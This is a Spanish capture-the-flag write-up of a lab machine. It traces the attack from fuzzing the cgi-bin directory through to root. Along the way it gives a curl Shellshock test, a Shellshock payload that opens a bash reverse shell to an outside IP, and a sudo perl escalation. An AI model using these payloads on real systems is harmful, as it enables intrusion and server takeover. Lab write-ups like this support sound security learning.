Empezamos listando los puertos abiertos: 

![image](https://user-images.githubusercontent.com/122020487/227734927-1d08866e-35e0-42b4-a802-09ee5d913842.png)

Vemos que solo tenemos el puerto 80 disponible para atacar ya que el puerto 2222 es ssh y no tenemos credenciales, por lo tanto entramos a la web viendo el siguiente contenido: 

![image](https://user-images.githubusercontent.com/122020487/227735008-08d49cee-aea2-4ffb-8c9a-f67c350a0225.png)

Como no vemos nada con lo que podamos empezar, comenzamos con el fuzzing de la web: 

![image](https://user-images.githubusercontent.com/122020487/227735075-73406ff3-13fb-448f-b525-2577c18b7286.png)

Vemos dos directorios en este caso nos interesa cgi-bins ya que a priori icons no debería ser de interés, por lo que procedemos a fuzzear el path de cgi-bin. Ya sabemos que este path contiene scripts y que puede ser vulnerable a shellshock por lo que procedemos a buscar los scripts que hay dentro del directorio:

wfuzz -c --hc=404 -t 200 -w /home/kali/Tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,sh-pl-cgi-ps1-py http://10.10.10.56/cgi-bin/FUZZ.FUZ2Z 

![image](https://user-images.githubusercontent.com/122020487/227735718-8d380e7b-4b3c-46b6-9a5e-f8d09a7103d0.png)

Hemos obtenido el script user.sh, por lo que si hacemos una petición al directorio se nos descargará el script: 

![image](https://user-images.githubusercontent.com/122020487/227735833-bc3621c8-80d3-43ec-a41a-24ecea5ae521.png)

Ahora procedemos con nmap a comprobar si este path es vulnerable a shellshock: 

![image](https://user-images.githubusercontent.com/122020487/227736032-8eaed6b7-2d65-430d-9af5-38fd22462638.png)

También para saber si es vulnerable podemos usar la siguiente petición: 

curl -H 'User-Agent: () { :; }; echo; echo web vulnerable' 'http://10.10.10.56/cgi-bin/user.sh'
![image](https://user-images.githubusercontent.com/122020487/227736234-d021e631-daf6-4619-aa8e-25361232a8fe.png)

Como vemos, el path es vulnerable por lo que empezamos a explotar la vulnerabilidad enviandonos una web shell: 

curl -H 'User-Agent: () { :; }; echo; /bin/bash -c "bash -i >& /dev/tcp/10.10.16.6/333 0>&1"' 'http://10.10.10.56/cgi-bin/user.sh'

Una vez hemos obtenido la webshell mediante netcat podemos ejecutar comandos en el propio servidor y obtener la flag del usuario:

![image](https://user-images.githubusercontent.com/122020487/227736480-40b7ae33-2c88-4580-b947-678209bc00fe.png)

La escalada es bastante fácil, lanzamos el comando sudo -l y vemos que podemos usar sudo con perl:

![image](https://user-images.githubusercontent.com/122020487/227736513-2e18f97d-1cdd-4665-8691-328f804e0e0e.png)

Por lo que conseguimos escalar privilegios con el siguiente comando: 

sudo perl -e 'exec "/bin/bash";'

![image](https://user-images.githubusercontent.com/122020487/227736596-71021373-88cd-4ea4-b66a-452d940cda63.png)
